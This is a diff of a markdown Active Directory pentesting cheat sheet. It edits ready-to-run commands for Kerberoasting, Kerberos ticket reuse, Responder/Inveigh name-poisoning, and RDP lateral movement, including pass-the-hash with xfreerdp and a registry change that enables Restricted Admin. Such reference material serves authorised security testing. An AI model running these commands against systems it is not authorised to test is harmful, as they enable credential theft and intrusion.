@@ -209,7 +209,7 @@
 
 * Don't forget to check ALL domains!
 * Impacket
-   * `GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <ip> -request`
+   * `GetUserSPNs.py <domain>/<user>:<pass> -dc-ip <ip> -request-user <username>`
 * PowerShell
    * `Invoke-Kerberoast -OutputFormat HashCat | Select-Object -ExpandProperty hash | Out-File -Encoding ascii kerberoast.txt`
 * Rubeus
@@ -460,7 +460,7 @@
 * Set the ticket for impacket use
    * `export KRB5CCNAME=/tmp/ticket.ccache`
 * Example: Get AD Users
-   * `proxychains GetADUsers.py -all -k -no-pass -dc-ip <dc-ip> <domain>/<user>`
+   * `proxychains GetADUsers.py -k -no-pass -dc-ip <dc-ip> <domain>/<user>`
       * -no-pass = Don't ask for password (useful for -k)
       * -k = Use Kerberos authentication.
 
@@ -469,6 +469,8 @@
 
 * [Responder](https://github.com/lgandx/Responder)
    * `responder -I eth0 -wd`
+   * -w = Start the WPAD rogue proxy server.
+   * -d = Enable answers for DHCP broadcast requests.
 * [InveighZero](https://github.com/Kevin-Robertson/InveighZero)
    * `Inveigh.exe -FileOutput Y -NBNS Y -mDNS Y -Proxy Y -MachineAccounts Y -DHCPv6 Y -LLMNRv6 Y [-Elevated N]`
 * [Inveigh](https://github.com/EmpireProject/Empire/blob/master/data/module_source/collection/Invoke-Inveigh.ps1)
@@ -586,23 +588,22 @@ Remember that amsi.dll is loaded into a new process to hook any input in the Pow
 
 ## Lateral - RDP (port 3389)
 
+* Rdesktop
+  * `rdesktop -d <domain> -u <user> -p <pass> <target>`
+* Xfreerdp
+  * `xfreerdp /d:<domain> /u:<user> /p:<pass> /v:<target> /cert-ignore /dynamic-resolution`
+  * `xfreerdp /d:<domain> /u:<user> /pth:<hash> /v:<target> /cert-ignore /dynamic-resolution`
+  * Optional shared drive: `/drive:home,/home/kali/temp/`
+* Enable PTH
+   * `New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force`
 * Enable Remote Desktop connections
    * `Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server'-name "fDenyTSConnections" -Value 0`
-* Enable Network Level Authentication
+* Enable Network Level Authentication (NLA)
    * `Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp' -name "UserAuthentication" -Value 1`
 * Enable Windows firewall rules to allow incoming RDP
    * `Enable-NetFirewallRule -DisplayGroup "Remote Desktop"`
-* Check open port
-   * `Test-NetConnection <host> -CommonTCPPort RDP`
 * Non-admin users
    * `Add-LocalGroupMember -Group "Remote Desktop Users" -Member <user>`
-* /admin
-   * The /admin flag in mstsc.exe allows us to connect to the admin session, which does not disconnect the current user if we perform the login with the same user.
-* Enable PTH
-   * `New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DisableRestrictedAdmin" -Value "0" -PropertyType DWORD -Force`
- * PTH with xfreerdp
-   * `xfreerdp /u:<user> /pth:<hash> /v:<ip> /cert-ignore /dynamic-resolution /timeout:100000 /compression-level:2 /bpp:8`
-   * Optional shared drive: `/drive:home,/home/kali/temp/`
 
 
 ## Lateral - WinRM (port 5985)
